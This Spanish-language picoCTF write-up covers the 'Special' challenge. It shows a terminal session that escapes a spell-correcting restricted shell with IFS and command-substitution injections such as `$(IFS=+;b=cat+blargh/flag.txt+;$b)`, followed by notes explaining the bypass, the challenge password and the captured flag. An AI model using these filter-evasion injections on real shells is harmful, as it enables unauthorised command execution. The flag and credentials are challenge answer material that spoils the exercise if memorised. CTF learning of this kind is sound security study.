**Reto**
	
**Descripción**
	Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.`ssh -p 55934 ctf-player@saturn.picoctf.net`The password is `af86add3`

**Conocimientos previos necesarios**
/		1. Que significan los siguientes caracteres?
		IFS → Por defecto quiere decir; espacio, tab, salto de línea
		$    → Llama variables o ejecuta comandos.
		$( ) → Ejecuta lo que está dentro.
		;     → Separa comandos.
		=   → Igualar algo.

**Solución**
	1. Usando terminal de picoCTF
		Lui5-picoctf@webshell:~$ ssh -p 55934 ctf-player@saturn.picoctf.net
		The authenticity of host '[saturn.picoctf.net]:55934 ([13.59.203.175]:55934)' can't be established.
		ED25519 key fingerprint is SHA256:tJ0wuU5yBvNO/FrkHmR9iY36VJClMhKV+Hq2sxqKFmg.
		This host key is known by the following other names/addresses:
		    ~/.ssh/known_hosts:13: [hashed name]
		    ~/.ssh/known_hosts:15: [hashed name]
		    ~/.ssh/known_hosts:20: [hashed name]
		Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
		Warning: Permanently added '[saturn.picoctf.net]:55934' (ED25519) to the list of known hosts.
		ctf-player@saturn.picoctf.net's password: 
		Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.8.0-1044-aws x86_64)
		
		 * Documentation:  https://help.ubuntu.com
		 * Management:     https://landscape.canonical.com
		 * Support:        https://ubuntu.com/advantage
		
		This system has been minimized by removing packages and content that are
		not required on a system that users do not log into.
		
		To restore this content, you can run the 'unminimize' command.
		
		The programs included with the Ubuntu system are free software;
		the exact distribution terms for each program are described in the
		individual files in /usr/share/doc/*/copyright.
		
		Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
		applicable law.
		
		Special$ ls
		Is 
		sh: 1: Is: not found
		Special$ IFS
		IFS 
		sh: 1: IFS: not found
		Special$ $IFS
		Ifs 
		sh: 1: Ifs: not found
		Special$ ${IFS}ls,b=blargh
		${IFS}ls,b=blargh 
		sh: 1: ls,b=blargh: not found
		Special$ ^CTraceback (most recent call last):
		  File "/usr/local/Special.py", line 11, in <module>
		    cmd = input("Special$ ")
		KeyboardInterrupt
		Connection to saturn.picoctf.net closed.
		Lui5-picoctf@webshell:~$ 
		Lui5-picoctf@webshell:~$ 
		Lui5-picoctf@webshell:~$ 
		Lui5-picoctf@webshell:~$ 
		Lui5-picoctf@webshell:~$ ssh -p 55934 ctf-player@saturn.picoctf.net
		ctf-player@saturn.picoctf.net's password: 
		Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.8.0-1044-aws x86_64)
		
		 * Documentation:  https://help.ubuntu.com
		 * Management:     https://landscape.canonical.com
		 * Support:        https://ubuntu.com/advantage
		
		This system has been minimized by removing packages and content that are
		not required on a system that users do not log into.
		
		To restore this content, you can run the 'unminimize' command.
		Last login: Sat Feb 21 01:20:06 2026 from 127.0.0.1
		Special$ ls
		Is 
		sh: 1: Is: not found
		Special$ $(ls)  
		$(ls) 
		sh: 1: blargh: not found
		Special$ $(ls;blargh)
		$(ls;blargh) 
		sh: 1: blargh: not found
		sh: 1: blargh: not found
		Special$ $(IFS)    
		$(IFS) 
		sh: 1: IFS: not found
		Special$ $(IFS=-)ls-blargh
		$(IFS=-)ls-blargh 
		sh: 1: ls-blargh: not found
		Special$ ${IFS}ls,b=blargh
		${IFS}ls,b=blargh 
		sh: 1: ls,b=blargh: not found
		Special$ ${IFS}ls;b=blargh
		${IFS}ls;b=blargh 
		blargh
		Special$ $(IFS=\;b=ls\blargh\;$b)
		$(IFS=\;b=ls\blargh\;$b) 
		Special$                           
		Traceback (most recent call last):
		  File "/usr/local/Special.py", line 19, in <module>
		    elif cmd[0] == '/':
		IndexError: string index out of range
		Connection to saturn.picoctf.net closed.
		Lui5-picoctf@webshell:~$ 
		Lui5-picoctf@webshell:~$ ssh -p 55934 ctf-player@saturn.picoctf.net
		ctf-player@saturn.picoctf.net's password: 
		Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.8.0-1044-aws x86_64)
		
		 * Documentation:  https://help.ubuntu.com
		 * Management:     https://landscape.canonical.com
		 * Support:        https://ubuntu.com/advantage
		
		This system has been minimized by removing packages and content that are
		not required on a system that users do not log into.
		
		To restore this content, you can run the 'unminimize' command.
		Last login: Sat Feb 21 01:22:59 2026 from 127.0.0.1
		Special$ $(IFS=+;b=cat+blargh/flag.txt+;$b)
		$(IFS=+;b=cat+blargh/flag.txt+;$b) 
		sh: 1: picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}: not found
		Special$ 

**Notes**
/		 1. Cómo funciona el reto: 
		El shell “Special” filtra y corrige automáticamente los comandos, bloqueando espacios y modificando la capitalización.  
		El objetivo es acceder a archivos y directorios a pesar de estas restricciones, usando técnicas de bypass bash restrictions.

/		 2. Método utilizado: 
		Se identificó que los espacios estaban bloqueados, pero el shell sigue respetando el separador interno `IFS` (Internal Field Separator).  
		Al redefinir `IFS` con otro carácter, por ejemplo `IFS=-;`, se podía reemplazar el espacio en los comandos.  
		Se utilizaron variables y ejecución de comandos para evadir la corrección de “Special”: 

		`${IFS}ls;b=blargh` → ejecuta `ls` y luego separa el comando `b=blargh` usando `;`. Esto permitió pensar que `blargh` contiene algo dentro.
		`$(ls)` → intentó ejecutar la salida de `ls` como comando; el shell intentó correr `blargh` como si fuera un ejecutable y falló (`sh: 1: blargh: not found`).
		`$(IFS=+;b=cat+blargh/flag.txt+;$b)` → ejecuta `cat blargh/flag.txt` usando `+` como separador, mostrando la bandera sin usar espacios literales.

/		 3. Resultados: 
		Directorio mostrado: blargh
			Es decir, al obtener de la ejecución de *Special$ $(ls)* `en la lineas 81-83` tenemos que muestra *sh: 1: blargh: not found* por lo tanto se asume que podría ser una ruta hacia la bandera.
		Bandera obtenida: picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}  

/		 4. Aprendizaje: 
		Manipular `IFS` permite reemplazar espacios bloqueados y ejecutar comandos separados.  
		Variables y sustituciones de comando (`$`, `$( )`) son útiles para evadir restricciones de parsing.  
		La salida de `ls` puede ser interpretada como comando si se usa `$(ls)`, por eso apareció el error “blargh: not found”.  
		El reto enseña cómo los filtros en shells personalizados pueden ser evadidos mediante conocimiento del shell interno y sus variables.

**Referencias**
	https://book.hacktricks.wiki/en/linux-hardening/bypass-bash-restrictions/index.html?